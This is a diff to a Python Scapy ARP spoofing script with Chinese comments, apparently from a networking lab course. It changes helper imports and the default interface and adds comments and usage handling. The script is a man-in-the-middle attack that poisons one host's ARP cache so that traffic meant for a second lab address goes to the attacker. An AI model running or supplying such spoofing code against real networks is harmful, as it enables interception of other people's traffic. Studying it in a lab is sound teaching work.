@@ -11,8 +11,8 @@ import logging
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # 清除报错
 from scapy.all import *
-from Part1_Classic_Protocols.Tools.GET_IP_IFCONFIG import get_ip_address_ifconfig  # 导入获取本机IP地址方法
-from Part1_Classic_Protocols.Tools.GET_MAC import get_mac_address  # 导入获取本机MAC地址方法
+from Tools.GET_IP_netifaces import get_ip_address  # 导入获取本机IP地址方法
+from Tools.GET_MAC_netifaces import get_mac_address  # 导入获取本机MAC地址方法
 from ARP_Request import arp_request  # 导入之前创建的ARP请求脚本
 import time
 import signal
@@ -25,7 +25,7 @@ def arp_spoof(ip_1, ip_2, ifname='ens33'):
     g_ifname = ifname  # 为全局变量赋值，攻击使用的接口名字
 
     # 获取本机IP地址，并且赋值到全局变量localip
-    localip = get_ip_address_ifconfig(ifname)['ip_address']
+    localip = get_ip_address(ifname)
     # 获取本机MAC地址，并且赋值到全局变量localmac
     localmac = get_mac_address(ifname)
     # 获取ip_1的真实MAC地址
@@ -60,12 +60,15 @@ def sigint_handler(signum, frame):  # 定义处理方法
 
 if __name__ == "__main__":
     # 使用Linux解释器
-    arp_spoof('10.1.1.253', '10.1.1.200')
+    arp_spoof('10.1.1.253', '10.1.1.200') # 欺骗10.1.1.253 让它认为10.1.1.200的MAC地址为本地攻击者计算机的MAC
     # from optparse import OptionParser
     # usage = "usage: ./scapy_arp_spoof 被欺骗主机IP 伪装主机的IP -i interface"
     # version = "version 1.0"
     # parser = OptionParser(usage=usage,version=version)
-    # parser.add_option("-i", "--interface", dest="iface",help="Specify an interface", default='ens160', type="string")
+    # parser.add_option("-i", "--interface", dest="iface",help="Specify an interface", default='ens33', type="string")
     # (options, args) = parser.parse_args()
     #
-    # arp_spoof(args[0], args[1], options.iface)
+    # try:
+    #     arp_spoof(args[0], args[1], options.iface)
+    # except IndexError:
+    #     print(usage)
